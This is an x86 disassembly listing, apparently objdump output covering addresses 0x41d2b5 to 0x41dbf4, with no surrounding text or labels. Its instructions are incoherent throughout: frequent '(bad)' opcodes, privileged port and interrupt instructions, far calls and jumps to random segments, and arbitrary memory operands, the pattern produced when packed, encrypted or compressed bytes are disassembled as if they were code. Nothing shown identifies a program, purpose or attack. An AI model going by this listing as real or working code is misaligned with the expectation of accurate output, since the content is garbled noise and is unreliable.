  41d2b5:	xor    esp,DWORD PTR [edx]
  41d2b7:	leave  
  41d2b8:	add    bl,BYTE PTR [edi+0x69718499]
  41d2be:	xor    BYTE PTR [edi+0x1e],ah
  41d2c1:	mov    ch,0xe1
  41d2c3:	gs dec ecx
  41d2c5:	fild   WORD PTR [edi]
  41d2c7:	iret   
  41d2c8:	xor    DWORD PTR [esi+0x9],edx
  41d2cb:	fiadd  WORD PTR [esi-0x76]
  41d2ce:	stos   BYTE PTR es:[edi],al
  41d2cf:	xchg   ecx,eax
  41d2d0:	call   0xf42c776a
  41d2d5:	ss mov ch,0xc5
  41d2d8:	cmc    
  41d2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2da:	pop    ds
  41d2db:	out    dx,eax
  41d2dc:	in     eax,0xfc
  41d2de:	pusha  
  41d2df:	sub    cl,BYTE PTR [edx-0x25423685]
  41d2e5:	adc    eax,0xcc2e858e
  41d2ea:	and    ecx,DWORD PTR [edi-0x1bda34c3]
  41d2f0:	test   BYTE PTR [ebp-0x7b],dl
  41d2f3:	sub    BYTE PTR [ebx-0x21],dh
  41d2f6:	out    0x38,eax
  41d2f8:	stos   DWORD PTR es:[edi],eax
  41d2f9:	or     esi,DWORD PTR [ecx-0x9]
  41d2fc:	ins    DWORD PTR es:[edi],dx
  41d2fd:	sbb    al,0xf9
  41d2ff:	mov    BYTE PTR [edx+0x5a8da931],dl
  41d305:	cli    
  41d306:	mov    esp,DWORD PTR [esi-0x48]
  41d309:	or     bl,ch
  41d30b:	xor    ebp,DWORD PTR [eax-0x17]
  41d30e:	sub    al,0xc5
  41d310:	adc    eax,DWORD PTR [eax]
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	pushf  
  41d381:	jmp    0x1:0x36cb9490
  41d388:	add    eax,0x5c000001
  41d38d:	loop   0x41d3f9
  41d38f:	test   eax,0xe754c623
  41d394:	lods   eax,DWORD PTR ds:[esi]
  41d395:	mov    al,0xff
  41d397:	stos   BYTE PTR es:[edi],al
  41d398:	icebp  
  41d399:	cmp    al,0x1a
  41d39b:	rol    DWORD PTR [eax],1
  41d39d:	sahf   
  41d39e:	and    ah,cl
  41d3a0:	cmp    BYTE PTR [esi],0x88
  41d3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3a4:	mov    ecx,0x8cd898f7
  41d3a9:	(bad)  
  41d3aa:	cmp    al,0xfe
  41d3ac:	mov    ebx,0x8232cd7e
  41d3b1:	adc    esp,0xffffffbe
  41d3b4:	and    esp,DWORD PTR [eax+esi*1+0x4b]
  41d3b8:	push   ebx
  41d3b9:	push   edi
  41d3ba:	data16 or bh,BYTE PTR [ecx+eiz*4]
  41d3be:	xchg   ecx,eax
  41d3bf:	rcr    esi,0x36
  41d3c2:	fidiv  WORD PTR [edi+esi*4+0x56]
  41d3c6:	or     BYTE PTR [esi],0x97
  41d3c9:	cmp    ch,BYTE PTR [eax+ecx*2]
  41d3cc:	fs dec edi
  41d3ce:	cmp    al,0xd6
  41d3d0:	stos   DWORD PTR es:[edi],eax
  41d3d1:	ret    0x543f
  41d3d4:	push   ebp
  41d3d5:	test   BYTE PTR [edi+0x497bc383],bh
  41d3db:	fstp   DWORD PTR [esi]
  41d3dd:	inc    esi
  41d3de:	out    0xdd,al
  41d3e0:	inc    edx
  41d3e1:	cmp    BYTE PTR ds:0xb37e36b,0xae
  41d3e8:	jecxz  0x41d463
  41d3ea:	pusha  
  41d3eb:	lock inc ebx
  41d3ed:	jbe    0x41d37d
  41d3ef:	jne    0x41d412
  41d3f1:	div    BYTE PTR [ebx+edx*8]
  41d3f4:	enter  0xfdb,0x0
  41d3f8:	int3   
  41d3f9:	fimul  DWORD PTR ds:0xb3e27ae5
  41d3ff:	dec    eax
  41d400:	pop    eax
  41d401:	mov    dh,0xc6
  41d403:	repz retf 0x98e2
  41d407:	nop
  41d408:	cmp    bh,cl
  41d40a:	loopne 0x41d415
  41d40c:	jae    0x41d38e
  41d40e:	jae    0x41d3ba
  41d410:	and    al,0xb
  41d412:	xchg   edx,eax
  41d413:	scas   eax,DWORD PTR es:[edi]
  41d414:	or     DWORD PTR [eax+0x31],edx
  41d417:	xor    DWORD PTR [esi],eax
  41d419:	adc    dh,al
  41d41b:	push   ebp
  41d41c:	mov    ds:0xf5672199,al
  41d421:	imul   DWORD PTR [ebp-0x19]
  41d424:	ror    DWORD PTR [ebx-0x1a17fb9e],0x4c
  41d42b:	out    0xce,eax
  41d42d:	add    DWORD PTR [eax],ecx
  41d42f:	push   es
  41d430:	jl     0x41d3d3
  41d432:	inc    esp
  41d433:	iret   
  41d434:	imul   ebx,ebx,0x9d0d960f
  41d43a:	test   al,0xf6
  41d43c:	xchg   esi,eax
  41d43d:	pop    ds
  41d43e:	idiv   BYTE PTR [esp+edx*4]
  41d441:	push   esp
  41d442:	popf   
  41d443:	pop    edx
  41d444:	sbb    edi,DWORD PTR [edx+ebx*8+0x3df18e19]
  41d44b:	es jge 0x41d482
  41d44e:	jl     0x41d46d
  41d450:	xor    al,0x22
  41d452:	or     eax,ebx
  41d454:	call   0x690:0x5f3d580a
  41d45b:	pop    esi
  41d45c:	cmp    al,0x42
  41d45e:	cdq    
  41d45f:	xchg   edi,eax
  41d460:	and    BYTE PTR [esi],bh
  41d462:	add    ah,BYTE PTR [edi+0x2a8fc3e4]
  41d468:	or     al,0x14
  41d46a:	mov    al,ds:0x3b18e7a7
  41d46f:	mov    dh,0x72
  41d471:	fiadd  WORD PTR [edx]
  41d473:	sub    esp,edx
  41d475:	ins    BYTE PTR es:[edi],dx
  41d476:	cmp    DWORD PTR [esi+0x7dcf7bd6],ebp
  41d47c:	mov    dh,0xa3
  41d47e:	push   ebx
  41d47f:	jg     0x41d487
  41d481:	(bad)  
  41d482:	ins    BYTE PTR es:[edi],dx
  41d483:	sub    al,0x30
  41d485:	shl    DWORD PTR [ecx+eax*4-0x2a7510ab],cl
  41d48c:	mov    eax,0xdb9084ee
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd004:0x27e8ae89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xaf000001
  41d50d:	ficomp DWORD PTR [eax-0x1728aa8b]
  41d513:	sub    edx,DWORD PTR [edx]
  41d515:	xor    DWORD PTR [ebp-0x296f50b5],ecx
  41d51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d51c:	aam    0x7d
  41d51e:	sbb    al,0x5e
  41d520:	sbb    al,0x54
  41d522:	in     al,0xb
  41d524:	pop    edi
  41d525:	add    DWORD PTR [ecx],eax
  41d527:	push   cs
  41d528:	lods   eax,DWORD PTR ds:[esi]
  41d529:	sti    
  41d52a:	fwait
  41d52b:	dec    esp
  41d52c:	clc    
  41d52d:	lea    ecx,[ebp-0x75]
  41d530:	arpl   WORD PTR [eax],bx
  41d532:	aam    0x53
  41d534:	mov    ?,esp
  41d536:	enter  0x5cef,0xb1
  41d53a:	shl    BYTE PTR [ecx],cl
  41d53c:	stos   DWORD PTR es:[edi],eax
  41d53d:	outs   dx,DWORD PTR ds:[si]
  41d53f:	leave  
  41d540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d541:	sbb    DWORD PTR [esi-0x1d50e5f3],edi
  41d547:	(bad)  
  41d548:	scas   al,BYTE PTR es:[edi]
  41d549:	loop   0x41d557
  41d54b:	pop    esi
  41d54c:	lahf   
  41d54d:	(bad)  
  41d54e:	dec    eax
  41d54f:	and    edi,edi
  41d551:	pop    es
  41d552:	fimul  WORD PTR [edi-0x7e]
  41d555:	(bad)  
  41d556:	leave  
  41d557:	dec    ebx
  41d559:	hlt    
  41d55a:	(bad)
  41d55e:	fld    DWORD PTR [ebx+0x1636ef91]
  41d564:	mov    DWORD PTR [esp+ecx*1-0x72],edx
  41d568:	mov    ebp,0x8a59bcd8
  41d56d:	popf   
  41d56e:	mov    ds:0x9ad2e054,al
  41d573:	cwde   
  41d574:	xchg   edx,eax
  41d575:	dec    esp
  41d576:	sahf   
  41d577:	and    BYTE PTR [edx-0x651df8b7],bh
  41d57d:	sbb    BYTE PTR [ebp+0x4f4993f7],al
  41d583:	mov    dh,0x4d
  41d585:	pushf  
  41d586:	add    esi,ebx
  41d588:	mov    ah,0xf8
  41d58a:	xchg   BYTE PTR [edx],ah
  41d58c:	adc    BYTE PTR [ebx-0x3c],ah
  41d58f:	sbb    al,0x58
  41d591:	or     BYTE PTR [esi],ah
  41d593:	xchg   DWORD PTR [edx+0x53096324],esi
  41d599:	gs sbb eax,0xbe8337e4
  41d59f:	imul   BYTE PTR [ecx+0x14dbca8d]
  41d5a5:	dec    edx
  41d5a6:	fild   QWORD PTR [edi]
  41d5a8:	mov    BYTE PTR [esi+0x6d],bh
  41d5ab:	jns    0x41d5e3
  41d5ad:	lea    ebp,[edx+0x49]
  41d5b0:	dec    edi
  41d5b1:	or     eax,0xd570207
  41d5b6:	fst    DWORD PTR ds:0xde66fbb5
  41d5bc:	pop    eax
  41d5bd:	jbe    0x41d540
  41d5bf:	xchg   esp,eax
  41d5c0:	xchg   esp,eax
  41d5c1:	push   esp
  41d5c2:	mov    eax,0xf8030d6c
  41d5c7:	or     al,0x2a
  41d5c9:	jmp    0x41d63a
  41d5cb:	cmp    edi,DWORD PTR [ecx+0x7]
  41d5ce:	pop    esp
  41d5cf:	imul   ebp,DWORD PTR [ebx],0xffffffd6
  41d5d2:	sbb    ah,ah
  41d5d4:	fwait
  41d5d5:	mov    BYTE PTR [esi],dh
  41d5d7:	push   ss
  41d5d8:	scas   eax,DWORD PTR es:[edi]
  41d5d9:	xor    DWORD PTR [ebx+edi*4+0x51],0xffffffa5
  41d5de:	mov    eax,0x8405f4c2
  41d5e3:	dec    si
  41d5e5:	inc    esi
  41d5e6:	pop    ss
  41d5e7:	in     al,0x7f
  41d5e9:	mov    ch,0x18
  41d5eb:	push   ecx
  41d5ec:	inc    ebx
  41d5ed:	pop    esi
  41d5ee:	lds    esi,FWORD PTR [ebp+0x18f0e690]
  41d5f4:	loop   0x41d653
  41d5f6:	push   ebx
  41d5f7:	pop    esi
  41d5f8:	inc    edx
  41d5f9:	scas   eax,DWORD PTR es:[edi]
  41d5fa:	add    edx,DWORD PTR [ebp+0x6b]
  41d5fd:	and    al,0x8d
  41d5ff:	fld    TBYTE PTR [edi]
  41d601:	jbe    0x41d5f7
  41d603:	int3   
  41d604:	test   eax,0x5f2cbab3
  41d609:	ja     0x41d685
  41d60b:	jle    0x41d66b
  41d60d:	cmp    esp,DWORD PTR [ebx]
  41d60f:	test   BYTE PTR [ecx+0x0],ah
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x6066e435
  41d681:	or     BYTE PTR [esp+esi*8],dl
  41d684:	aad    0x38
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0xb5000001
  41d68d:	push   ss
  41d68e:	dec    ebp
  41d68f:	test   ah,ah
  41d691:	inc    ecx
  41d692:	stos   BYTE PTR es:[edi],al
  41d693:	cmp    BYTE PTR [edx-0x2a],bh
  41d696:	les    edx,FWORD PTR ds:0x936bc70
  41d69c:	ret    0xa6e5
  41d69f:	jmp    0xc1:0x5f24d8e0
  41d6a6:	jp     0x41d6c6
  41d6a8:	xchg   edx,eax
  41d6a9:	push   0x77
  41d6ab:	cmp    edi,0x33092e8b
  41d6b1:	aas    
  41d6b2:	fmul   DWORD PTR [eax]
  41d6b4:	xchg   esp,eax
  41d6b5:	adc    dh,bh
  41d6b7:	push   es
  41d6b8:	shl    ebp,0x2b
  41d6bb:	mov    al,0x59
  41d6bd:	addr16 ds jmp 0x298f0e1e
  41d6c4:	push   ecx
  41d6c5:	shl    DWORD PTR [esi+0x4a],0x64
  41d6c9:	mov    cs,WORD PTR [esi]
  41d6cb:	adc    ebx,DWORD PTR [edx]
  41d6cd:	movntps XMMWORD PTR [ebx],xmm6
  41d6d0:	push   edi
  41d6d1:	stos   DWORD PTR es:[edi],eax
  41d6d2:	inc    edx
  41d6d3:	push   esi
  41d6d4:	xor    DWORD PTR [edi+0x5e],0xbfc7d65
  41d6db:	pop    ss
  41d6dc:	les    ecx,FWORD PTR [eax]
  41d6de:	add    dl,BYTE PTR [eax-0x29]
  41d6e1:	xchg   BYTE PTR [ebx],bh
  41d6e3:	ret    0x3ef7
  41d6e6:	mov    ebx,DWORD PTR [esi-0x3f]
  41d6e9:	xchg   ebx,eax
  41d6ea:	or     eax,0x7c65631b
  41d6ef:	popa   
  41d6f0:	mov    DWORD PTR [edi+0x3b3a62fe],ecx
  41d6f6:	push   ebx
  41d6f7:	rol    DWORD PTR [esi-0x38],0x70
  41d6fb:	xchg   edx,eax
  41d6fc:	xchg   edx,eax
  41d6fd:	jbe    0x41d6c2
  41d6ff:	sbb    ch,BYTE PTR [edi-0x12]
  41d702:	sub    ah,dh
  41d704:	add    ecx,eax
  41d706:	and    eax,0xdbd9f879
  41d70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d70c:	push   es
  41d70d:	mov    ds:0xda3a1734,al
  41d713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d714:	imul   BYTE PTR [edx+0x22]
  41d717:	add    ebx,esp
  41d719:	hlt    
  41d71a:	mov    esi,0xd85fd414
  41d71f:	push   esi
  41d720:	adc    ecx,DWORD PTR [edi+0x51]
  41d723:	mov    ebx,DWORD PTR [ebx]
  41d725:	in     eax,0xf4
  41d727:	ja     0x41d70c
  41d729:	jmp    0x41d767
  41d72b:	cld    
  41d72c:	leave  
  41d72d:	inc    ebp
  41d72e:	and    edx,DWORD PTR [ecx+0x3c]
  41d731:	xor    BYTE PTR [edx],bl
  41d733:	in     eax,dx
  41d734:	jle    0x41d70c
  41d736:	retf   0xdc24
  41d739:	(bad)  
  41d73a:	(bad)  
  41d73b:	xor    ebp,edi
  41d73d:	adc    ebp,DWORD PTR [ebx]
  41d73f:	sti    
  41d740:	and    al,0xff
  41d742:	pop    edi
  41d743:	mov    ah,al
  41d745:	clc    
  41d746:	push   ebp
  41d747:	les    esi,FWORD PTR es:[ebp+ebp*2+0x5ac3ddfb]
  41d74f:	mov    ebp,0x156069b6
  41d754:	pop    esi
  41d755:	xor    DWORD PTR [edx],0xe1dda406
  41d75b:	jae    0x41d79f
  41d75d:	pop    es
  41d75e:	pop    esi
  41d75f:	inc    esp
  41d760:	out    0xa4,al
  41d762:	stos   DWORD PTR es:[edi],eax
  41d763:	inc    edx
  41d764:	xlat   BYTE PTR ds:[ebx]
  41d765:	dec    esp
  41d766:	adc    cl,bl
  41d768:	push   ebx
  41d769:	mov    ebp,DWORD PTR [ebx+0x6a]
  41d76c:	and    BYTE PTR [edx],ah
  41d76e:	ret    0x4404
  41d771:	jp     0x41d79a
  41d773:	jae    0x41d7c7
  41d775:	xchg   esi,eax
  41d776:	dec    edx
  41d777:	mov    ecx,0xcf06dacc
  41d77c:	stc    
  41d77d:	push   ecx
  41d77e:	sar    DWORD PTR [ecx+0x2c],cl
  41d781:	adc    BYTE PTR [eax-0x22a515ed],ah
  41d787:	mov    ah,0x31
  41d789:	fmul   QWORD PTR [ebx-0x54]
  41d78c:	mov    edx,0x56b1d271
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	push   0xffffff82
  41d802:	xor    ecx,ebp
  41d804:	fidivr DWORD PTR [ecx]
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    eax,0xc6000001
  41d80d:	out    dx,eax
  41d80e:	rcl    DWORD PTR [esi+0x5],1
  41d811:	mov    ch,0x7f
  41d813:	lea    esp,[eax-0x7a]
  41d816:	(bad)  
  41d817:	sub    ch,0x98
  41d81a:	(bad)  
  41d81b:	sub    DWORD PTR [ecx-0x6],esp
  41d81e:	adc    edx,eax
  41d820:	pop    ds
  41d821:	jg     0x41d849
  41d823:	push   ss
  41d824:	mov    ebp,0x9843927f
  41d829:	fld    QWORD PTR [ebp+esi*1+0x6e464205]
  41d830:	push   edi
  41d831:	sbb    eax,0x61441151
  41d836:	clc    
  41d837:	jmp    0x69910c6d
  41d83c:	or     DWORD PTR ds:0x6ac56d00,esp
  41d842:	sbb    BYTE PTR [esi+0x34],dl
  41d845:	das    
  41d846:	pop    ebp
  41d847:	push   ds
  41d848:	rcl    BYTE PTR [ecx],cl
  41d84a:	int3   
  41d84b:	push   cs
  41d84c:	test   DWORD PTR [esi+0x616339fe],eax
  41d852:	int3   
  41d853:	mov    al,ds:0x2ead61ca
  41d858:	out    dx,al
  41d859:	sbb    dl,bh
  41d85b:	fdiv   st,st(5)
  41d85d:	test   eax,0x19b3109e
  41d862:	cli    
  41d863:	daa    
  41d864:	fsubr  DWORD PTR [ebp+0x18d7d5de]
  41d86a:	fistp  DWORD PTR [ecx]
  41d86c:	je     0x41d8a8
  41d86e:	or     al,0x98
  41d870:	xchg   DWORD PTR [esi+0x373f4203],edx
  41d876:	xor    bl,BYTE PTR [edi-0x40]
  41d879:	sti    
  41d87a:	das    
  41d87b:	cs sbb al,0x3a
  41d87e:	or     al,0x1f
  41d880:	xchg   ebp,eax
  41d881:	(bad)  
  41d882:	jp     0x41d861
  41d884:	mov    ds:0x5c429b66,al
  41d889:	jg     0x41d8eb
  41d88b:	int3   
  41d88c:	cmp    DWORD PTR [edx+0x31e7c24b],esp
  41d892:	inc    ebx
  41d893:	jnp    0x41d821
  41d895:	rcl    dl,1
  41d897:	pop    ds
  41d898:	jmp    0x41d90e
  41d89a:	lds    ebx,FWORD PTR [ebx]
  41d89c:	inc    ebp
  41d89d:	inc    DWORD PTR [ecx-0x517fbb40]
  41d8a3:	pop    eax
  41d8a4:	or     edx,DWORD PTR [ecx+0x23388a77]
  41d8aa:	call   0xad95:0xab385c59
  41d8b1:	push   ss
  41d8b2:	xor    ecx,DWORD PTR [ecx]
  41d8b4:	imul   esi
  41d8b6:	pop    ds
  41d8b7:	mov    al,0xd4
  41d8b9:	clc    
  41d8ba:	or     bl,BYTE PTR [ebp+0x70ca3f06]
  41d8c0:	test   BYTE PTR [eax+eax*4-0x5be5a10d],al
  41d8c7:	repz xor al,ch
  41d8ca:	test   BYTE PTR [ecx+ebx*1+0x19],bl
  41d8ce:	(bad)  
  41d8cf:	or     al,al
  41d8d1:	icebp  
  41d8d2:	push   es
  41d8d3:	fidivr WORD PTR [edi]
  41d8d5:	jle    0x41d8ef
  41d8d7:	xor    edx,0xbfd7d650
  41d8dd:	(bad)  
  41d8de:	push   ss
  41d8df:	fsubr  st(4),st
  41d8e1:	out    0x20,al
  41d8e3:	hlt    
  41d8e4:	fst    DWORD PTR [eax]
  41d8e6:	pop    ebp
  41d8e7:	push   cs
  41d8e8:	ja     0x41d932
  41d8ea:	das    
  41d8eb:	mov    bl,0x32
  41d8ed:	adc    dl,BYTE PTR [ecx]
  41d8ef:	dec    edi
  41d8f0:	rcl    ah,cl
  41d8f2:	xor    dl,BYTE PTR [edi+0x44ea8a08]
  41d8f8:	aad    0xe8
  41d8fa:	inc    esi
  41d8fb:	inc    esi
  41d8fc:	inc    ebp
  41d8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8fe:	cmc    
  41d8ff:	jge    0x41d94f
  41d901:	and    al,0xa2
  41d903:	vxorps ymm5,ymm6,YMMWORD PTR [ebx]
  41d907:	cmp    edx,esp
  41d909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d90a:	xchg   ch,ch
  41d90c:	sub    ch,ah
  41d90e:	xchg   ebx,eax
  41d90f:	lds    eax,FWORD PTR [esi]
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs nop
  41d981:	call   0x1:0x3adf5f8d
  41d988:	add    eax,0xa000001
  41d98d:	xchg   esp,edx
  41d98f:	ret    
  41d990:	test   al,0xa3
  41d992:	jo     0x41d941
  41d994:	sub    al,0x33
  41d996:	mov    ebx,0xd4d55e5d
  41d99b:	popf   
  41d99c:	mov    dh,BYTE PTR [edx+0x1c]
  41d99f:	mov    ?,ecx
  41d9a1:	mov    bh,0x63
  41d9a3:	mul    BYTE PTR [eax-0x7]
  41d9a6:	ja     0x41d9d6
  41d9a8:	out    0x59,al
  41d9aa:	fldcw  WORD PTR ss:[ecx]
  41d9ad:	dec    eax
  41d9ae:	push   ecx
  41d9af:	xchg   ebp,eax
  41d9b0:	(bad)  
  41d9b2:	fistp  DWORD PTR [esi-0x4e]
  41d9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9b6:	inc    esp
  41d9b7:	and    cl,BYTE PTR ds:0xd4f9880
  41d9bd:	push   ds
  41d9be:	inc    ecx
  41d9bf:	fwait
  41d9c0:	push   ecx
  41d9c1:	in     eax,dx
  41d9c2:	add    eax,0x6af724f6
  41d9c7:	mov    DWORD PTR [esi-0x413f2d79],ebp
  41d9cd:	ja     0x41da24
  41d9cf:	cdq    
  41d9d0:	xchg   edi,eax
  41d9d1:	push   cs
  41d9d2:	loop   0x41d955
  41d9d4:	(bad)  
  41d9d5:	pushf  
  41d9d6:	or     DWORD PTR [ebx+eiz*1-0x27],ebx
  41d9da:	dec    ebp
  41d9db:	popa   
  41d9dc:	push   0xffffffa6
  41d9de:	fild   WORD PTR [edi+0x14]
  41d9e1:	mov    ch,0x44
  41d9e3:	cdq    
  41d9e4:	loope  0x41da11
  41d9e6:	mov    BYTE PTR [esi+0x17],ah
  41d9e9:	lods   eax,DWORD PTR ds:[esi]
  41d9ea:	xor    ebp,DWORD PTR [edi-0x5b488712]
  41d9f0:	lock mov al,al
  41d9f3:	outs   dx,BYTE PTR ds:[esi]
  41d9f4:	jmp    0x93be396b
  41d9f9:	loope  0x41d998
  41d9fb:	dec    ebp
  41d9fc:	adc    DWORD PTR [ebx+0x7c],eax
  41d9ff:	jle    0x41d9ba
  41da01:	mul    ecx
  41da03:	mov    ecx,0xd1fa41a8
  41da08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da09:	add    ch,BYTE PTR ds:0x1c1317e1
  41da0f:	out    dx,al
  41da10:	jns    0x41da36
  41da12:	call   0x67606c4b
  41da17:	dec    edi
  41da18:	xchg   esp,eax
  41da19:	fcom   DWORD PTR [eax]
  41da1b:	xchg   esi,eax
  41da1c:	mov    al,ds:0x32aef0f8
  41da21:	adc    bh,bh
  41da23:	test   eax,0x44bddf5
  41da28:	jae    0x41da35
  41da2a:	jbe    0x41da38
  41da2c:	dec    esp
  41da2d:	or     DWORD PTR [eax],esi
  41da2f:	sub    ch,BYTE PTR [edx+edx*1]
  41da32:	fsub   DWORD PTR [ecx+0x8c820c7]
  41da38:	ffreep st(0)
  41da3a:	mov    eax,0x9134cbd4
  41da3f:	mov    esi,0x43af8c7a
  41da44:	xchg   DWORD PTR [esi+edx*1+0x3b],ebp
  41da48:	data16 xlat BYTE PTR ds:[ebx]
  41da4a:	jb     0x41d9fa
  41da4c:	adc    al,0x7e
  41da4e:	xchg   ebp,eax
  41da4f:	cdq    
  41da50:	push   esp
  41da51:	jp     0x41daad
  41da53:	das    
  41da54:	mov    cl,0xb8
  41da56:	test   edi,esp
  41da58:	sub    dh,BYTE PTR [edi]
  41da5a:	push   ss
  41da5b:	sub    esp,DWORD PTR [esi]
  41da5d:	mov    gs,WORD PTR [ebx-0x40e4f4f1]
  41da63:	or     BYTE PTR [eax+0x6b157083],cl
  41da69:	sub    al,0x15
  41da6b:	sahf   
  41da6c:	stc    
  41da6d:	lods   al,BYTE PTR ds:[esi]
  41da6e:	cmp    al,BYTE PTR [esi]
  41da70:	fdiv   st,st(4)
  41da72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da73:	js     0x41dac4
  41da75:	movd   mm2,DWORD PTR [esi-0x2f]
  41da79:	sbb    bl,BYTE PTR [edx+eiz*2-0x32]
  41da7d:	out    0xc7,eax
  41da7f:	and    eax,0x67c56c7a
  41da84:	xchg   edx,eax
  41da85:	in     eax,0xa8
  41da87:	sbb    al,0x52
  41da89:	outs   dx,DWORD PTR ds:[esi]
  41da8a:	push   ebx
  41da8b:	rol    DWORD PTR [ebx-0xb],0x5
  41da8f:	mov    esp,0x51
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xfffffff5
  41db01:	jnp    0x41db50
  41db03:	mov    ds:0x13be4,al
  41db08:	add    eax,0x4c000001
  41db0d:	stos   DWORD PTR es:[edi],eax
  41db0e:	cmp    DWORD PTR [ecx-0x1f],esi
  41db11:	in     eax,0xca
  41db13:	nop
  41db14:	ss dec ecx
  41db16:	test   DWORD PTR [eax],esi
  41db18:	adc    al,0xc5
  41db1a:	and    eax,0x4dbdc3df
  41db1f:	aam    0x5f
  41db21:	mov    WORD PTR [esi],ss
  41db23:	cmp    edx,edx
  41db25:	cwde   
  41db26:	retf   0xd896
  41db29:	(bad)  
  41db2a:	inc    DWORD PTR [edx-0x3b]
  41db2d:	adc    al,0x4c
  41db2f:	popa   
  41db30:	mov    eax,DWORD PTR [edx+0x5d]
  41db33:	pop    ecx
  41db34:	jecxz  0x41dad9
  41db36:	test   BYTE PTR [edx+0x35],0x53
  41db3a:	ds pop eax
  41db3c:	lods   ax,WORD PTR es:[esi]
  41db3f:	es popa 
  41db41:	push   ss
  41db42:	jecxz  0x41db9f
  41db44:	jbe    0x41dad8
  41db46:	inc    eax
  41db47:	inc    edi
  41db48:	xor    esp,DWORD PTR ss:[ebx]
  41db4b:	adc    cl,dh
  41db4d:	popf   
  41db4e:	mov    al,ds:0x852d7155
  41db53:	les    eax,FWORD PTR ds:0x5d5e82a0
  41db59:	enter  0xf06d,0x76
  41db5d:	jmp    0xf6da6a3
  41db62:	xchg   esi,eax
  41db63:	jno    0x41dba2
  41db65:	fisub  DWORD PTR [esi-0xe]
  41db68:	arpl   WORD PTR [edi+0x1d],bp
  41db6b:	daa    
  41db6c:	cmp    ch,BYTE PTR [eax+ebx*1-0x21a6ff6c]
  41db73:	test   eax,0x7cd91b85
  41db78:	loopne 0x41db72
  41db7a:	xor    BYTE PTR [ebx+ebp*1],ah
  41db7d:	add    eax,0x3067bbc5
  41db82:	daa    
  41db83:	jmp    FWORD PTR [edi]
  41db85:	inc    ebx
  41db86:	(bad)  
  41db88:	fild   DWORD PTR [ebx]
  41db8a:	mov    ebp,0xdc800b26
  41db8f:	xchg   ebx,eax
  41db90:	pop    ecx
  41db91:	sbb    edi,DWORD PTR [eax+0x3b]
  41db94:	jle    0x41db16
  41db96:	mov    ds:0xf036cb6c,al
  41db9b:	inc    edx
  41db9c:	sub    edx,DWORD PTR [ebx]
  41db9e:	enter  0x155d,0x5c
  41dba2:	stos   DWORD PTR es:[edi],eax
  41dba3:	loopne 0x41db90
  41dba5:	mov    ah,0xaf
  41dba7:	jl     0x41dbf7
  41dba9:	out    dx,al
  41dbaa:	dec    esi
  41dbab:	cmc    
  41dbac:	inc    edx
  41dbad:	mov    BYTE PTR [ebx],ah
  41dbaf:	pushf  
  41dbb0:	aas    
  41dbb1:	inc    eax
  41dbb2:	xchg   ebp,eax
  41dbb3:	pop    ds
  41dbb4:	rol    dl,1
  41dbb6:	ins    WORD PTR es:[edi],dx
  41dbb8:	repz ss jnp 0x41dbaf
  41dbbc:	sub    eax,DWORD PTR [esi]
  41dbbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbbf:	dec    ebp
  41dbc0:	xlat   BYTE PTR ds:[ebx]
  41dbc1:	cs pop eax
  41dbc3:	pop    ss
  41dbc4:	das    
  41dbc5:	and    bl,BYTE PTR ds:0x7e3331bd
  41dbcb:	add    al,0x71
  41dbcd:	mov    cl,0xec
  41dbcf:	and    BYTE PTR [eax+0x58],dh
  41dbd2:	pop    ss
  41dbd3:	dec    esp
  41dbd4:	bound  edx,QWORD PTR ds:0x6266cc38
  41dbda:	pop    edx
  41dbdb:	lods   eax,DWORD PTR ds:[esi]
  41dbdc:	xor    BYTE PTR [eax],ah
  41dbde:	je     0x41dc47
  41dbe0:	retf   
  41dbe1:	mov    dh,0xc3
  41dbe3:	popf   
  41dbe4:	xor    edx,DWORD PTR [ecx]
  41dbe6:	add    eax,ebx
  41dbe8:	pop    ss
  41dbe9:	fnstenv [ebp+0x2e]
  41dbec:	out    0x76,al
  41dbee:	cmp    bl,dl
  41dbf0:	ja     0x41db88
  41dbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf3:	dec    ecx
  41dbf4:	add    BYTE PTR [edi-0x492731d8],cl
